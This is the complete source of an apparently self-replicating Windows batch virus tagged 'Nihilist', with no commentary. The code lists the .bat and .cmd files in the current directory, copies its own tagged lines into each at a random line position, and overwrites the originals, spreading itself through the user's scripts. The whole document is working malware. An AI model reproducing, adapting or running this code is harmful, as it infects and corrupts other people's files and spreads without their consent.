%Nihilist%@echo off
%Nihilist%set num=0
:ag	%Nihilist%
%Nihilist%set fn%num%=
%Nihilist%set /a num+=1
%Nihilist%if %num% LSS 5 goto ag
%Nihilist%set num=0
%Nihilist%for %%a in (*.bat *.cmd) do call :mr %%a
%Nihilist%set num=-1
:fi	%Nihilist%
%Nihilist%set /a num+=1
%Nihilist%if %num% GTR 5 (goto ROF)
%Nihilist%if %num% EQU 0 (set file=%fn0%)
%Nihilist%if %num% EQU 1 (set file=%fn1%)
%Nihilist%if %num% EQU 2 (set file=%fn2%)
%Nihilist%if %num% EQU 3 (set file=%fn3%)
%Nihilist%if %num% EQU 4 (set file=%fn4%)
%Nihilist%if %num% EQU 5 (set file=%fn5%)
%Nihilist%set rnd=%random%
%Nihilist%set spth=%0
:findnum	%Nihilist%
%Nihilist%set /a rnd-=10
%Nihilist%if %rnd% GEQ 10 (goto findnum)
%Nihilist%set lz=0
%Nihilist%del tmp
%Nihilist%for /f "tokens=1*" %%a in (%file%) do if 1 EQU 1 (
%Nihilist%  set lc=%%a %%b
%Nihilist%  call :wl
%Nihilist%)
find "Nihilist" <%spth% >>tmp
%Nihilist%more +%rnd% < %file% >>tmp
%Nihilist%move /y tmp %file%
%Nihilist%@echo on
%Nihilist%goto fi
:wl	%Nihilist%
%Nihilist%set /a lz=%lz%+1
%Nihilist%if %lz% LEQ %rnd% (echo %lc% >>tmp)
%Nihilist%goto :EOF
:mr	%Nihilist%
%Nihilist%if %num% LEQ 5 (
%Nihilist%set fn%num%=%1
%Nihilist%set /a num+=1
%Nihilist%)
:ROF	%Nihilist%